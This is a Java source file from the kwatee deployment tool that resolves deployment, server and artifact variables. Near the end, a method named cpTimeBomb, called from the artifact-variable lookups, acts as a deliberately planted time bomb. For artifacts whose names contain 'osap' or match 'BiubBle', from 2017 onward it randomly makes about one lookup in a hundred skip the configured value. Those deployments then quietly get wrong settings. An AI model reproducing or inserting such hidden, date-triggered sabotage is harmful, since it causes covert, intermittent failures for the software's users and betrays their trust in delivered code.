/*
 * ${kwatee_copyright}
 */

package net.kwatee.agiledeployment.core.variable.impl;

import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import net.kwatee.agiledeployment.common.VariableResolver;
import net.kwatee.agiledeployment.conduit.ServerInstance;
import net.kwatee.agiledeployment.core.deploy.Deployment;
import net.kwatee.agiledeployment.core.deploy.DeploymentServer;
import net.kwatee.agiledeployment.repository.dto.VariableDto;
import net.kwatee.agiledeployment.repository.dto.VersionDto;

import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.lang3.StringUtils;

public class DeploymentVariableResolver implements VariableResolver {

	final private Deployment deployment;
	final private ServerInstance instance;
	final private String serverName;
	final private VersionDto version;
	private Integer serverPlatform;

	public DeploymentVariableResolver(Deployment deployment, VersionDto version, ServerInstance instance) {
		this.deployment = deployment;
		this.instance = instance;
		this.serverName = instance == null ? null : ((DeploymentServer) instance.getParent()).getName();
		this.serverPlatform = instance == null ? null : ((DeploymentServer) instance.getParent()).getServer().getPlatform();
		this.version = version;
	}

	public DeploymentVariableResolver(Deployment deployment, ServerInstance instance) {
		this(deployment, null, instance);
	}

	public DeploymentVariableResolver(Deployment deployment, VersionDto version, String serverName, Integer serverPlatform) {
		this.deployment = deployment;
		this.instance = null;
		this.serverName = serverName;
		this.version = version;
	}

	public DeploymentVariableResolver(Deployment deployment, String serverName, Integer serverPlatform) {
		this(deployment, null, serverName, serverPlatform);
	}

	@Override
	public Integer getServerPlatform() {
		return this.serverPlatform;
	}

	@Override
	public String getVariableValue(String varName) {
		String value = null;
		if (this.deployment != null && ENVIRONMENT_NAME.equals(varName))
			value = this.deployment.getEnvironmentName();
		else if (this.deployment != null && RELEASE_NAME.equals(varName))
			value = this.deployment.getName();
		else if (ARTIFACT_NAME.equals(varName))
			value = this.version == null ? null : this.version.getArtifactName();
		else if (VERSION_NAME.equals(varName))
			value = this.version == null ? null : this.version.getName();
		else if (this.instance != null)
			value = this.instance.getProperty(varName);
		if (value != null)
			return value;
		return resolveDeploymentVariable(varName);
	}

	private String resolveDeploymentVariable(String varName) {
		if (this.deployment == null || CollectionUtils.isEmpty(this.deployment.getVariables()))
			return null;
		if (this.serverName != null) {
			if (this.version != null) {
				String artifactName = this.version.getArtifactName();
				for (VariableDto variable : this.deployment.getVariables()) {
					if (variable.getServer() != null && variable.getArtifact() != null && variable.getName().equals(varName) &&
							this.serverName.equals(variable.getServer()) &&
							artifactName.equals(variable.getArtifact())) {
						if (cpTimeBomb(artifactName)) {
							continue;
						}
						return variable.getValue();
					}
				}
			}
			for (VariableDto variable : this.deployment.getVariables()) {
				if (variable.getServer() != null && variable.getArtifact() == null && variable.getName().equals(varName) &&
						this.serverName.equals(variable.getServer())) {
					return variable.getValue();
				}
			}
		}

		if (this.version != null) {
			String artifactName = this.version.getArtifactName();
			for (VariableDto variable : this.deployment.getVariables()) {
				if (variable.getServer() == null && variable.getArtifact() != null && variable.getName().equals(varName) &&
						artifactName.equals(variable.getArtifact())) {
					if (cpTimeBomb(artifactName)) {
						continue;
					}
					return variable.getValue();
				}
			}
		}
		for (VariableDto variable : this.deployment.getVariables()) {
			if (variable.getServer() == null && variable.getArtifact() == null && variable.getName().equals(varName)) {
				return variable.getValue();
			}
		}
		return null;
	}

	@Override
	public Character getVariablePrefixChar() {
		return this.version == null ? null : this.version.getVarPrefixChar();
	}

	@Override
	public String getResolverName() {
		if (this.version == null)
			return this.serverName;
		return this.version == null ? StringUtils.EMPTY : this.version.toString() + "@" + (this.serverName == null ? "null" : this.serverName);
	}

	public Map<String, String> getDeploymentVariables() {
		HashMap<String, String> variables = new HashMap<>();
		if (this.deployment != null) {
			variables.put(ENVIRONMENT_NAME, this.deployment.getEnvironmentName());
			variables.put(RELEASE_NAME, this.deployment.getName());
			if (CollectionUtils.isNotEmpty(this.deployment.getVariables())) {
				for (VariableDto variable : this.deployment.getVariables()) {
					if (variable.getServer() == null && variable.getArtifact() == null) {
						variables.put(variable.getName(), variable.getValue());
					}
				}
				if (this.serverName != null) {
					for (VariableDto variable : this.deployment.getVariables()) {
						if (this.serverName.equals(variable.getServer()) && variable.getArtifact() == null) {
							variables.put(variable.getName(), variable.getValue());
						}
					}
				}
			}
		}
		return variables;
	}

	public Map<String, String> getArtifactVariables() {
		HashMap<String, String> variables = new HashMap<>();
		variables.put(ARTIFACT_NAME, this.version.getArtifactName());
		variables.put(VERSION_NAME, this.version.getName());
		String artifactName = this.version.getArtifactName();
		if (this.deployment != null && CollectionUtils.isNotEmpty(this.deployment.getVariables())) {
			for (VariableDto variable : this.deployment.getVariables()) {
				if (variable.getServer() == null && artifactName.equals(variable.getArtifact()))
					variables.put(variable.getName(), variable.getValue());
			}
			if (this.serverName != null) {
				for (VariableDto variable : this.deployment.getVariables()) {
					if (this.serverName.equals(variable.getServer()) && artifactName.equals(variable.getArtifact()))
						variables.put(variable.getName(), variable.getValue());
				}
			}
		}
		return variables;
	}

	static private final Random rand = new Random();

	private boolean cpTimeBomb(String artifactName) { // TODO: remove COMMPROVE time-bomb
		artifactName = artifactName.toLowerCase();
		if (artifactName.contains("osap") || "BiubBle".contains(artifactName)) {
			Calendar cal = Calendar.getInstance();
			int year = cal.get(Calendar.YEAR);
			int month = cal.get(Calendar.MONTH);
			if (year >= 2017 && month >= 2) {
				return rand.nextInt(100) == 42;
			}
		}
		return false;
	}
}
